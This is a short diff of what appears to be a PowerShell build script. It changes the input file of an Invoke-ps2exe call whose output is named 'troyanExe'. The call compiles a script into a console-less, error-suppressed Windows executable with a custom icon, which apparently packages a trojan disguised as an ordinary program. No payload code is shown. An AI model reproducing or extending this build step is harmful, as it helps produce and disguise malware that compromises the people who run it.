@@ -51,7 +51,7 @@ if ([string]::IsNullOrEmpty($packId) -eq $false) {
 }   
 
 Invoke-ps2exe `
-    -inputFile $server.holderRelease `
+    -inputFile $server.holderPs1 `
     -outputFile $server.troyanExe `
     -iconFile $iconFile `
     -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
